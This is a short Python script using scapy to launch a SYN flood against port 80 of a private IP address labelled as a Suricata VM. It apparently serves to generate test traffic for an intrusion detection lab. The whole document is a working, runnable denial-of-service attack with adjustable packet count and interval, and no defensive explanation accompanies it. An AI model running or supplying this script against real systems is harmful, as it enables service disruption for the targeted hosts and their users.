```python
from scapy.all import *
import time

# Configuration
target_ip = "192.168.138.129"  # Suricata VM IP
target_port = 80
fixed_src_ip = "192.168.138.128"  # Consistent source IP
num_packets = 50
interval = 10

# Generate SYN flood attack
def syn_flood(target_ip, target_port, num_packets, interval):
    try:
        while True:
            print(f"Sending {num_packets} SYN packets from {fixed_src_ip} to {target_ip}:{target_port} in the next {interval} seconds.")
            
            start_time = time.time()
            for _ in range(num_packets):
                src_port = random.randint(1024, 65535)
                ip = IP(src=fixed_src_ip, dst=target_ip)
                syn = TCP(sport=src_port, dport=target_port, flags="S")
                
                send(ip/syn, verbose=0)
                time.sleep(interval / num_packets)
            
            elapsed_time = time.time() - start_time
            if elapsed_time < interval:
                time.sleep(interval - elapsed_time)
            
            print(f"Completed sending {num_packets} SYN packets. Waiting for the next interval...\n")

    except KeyboardInterrupt:
        print("\nSYN flood attack stopped.")

# Run the SYN flood attack
syn_flood(target_ip, target_port, num_packets, interval)
```
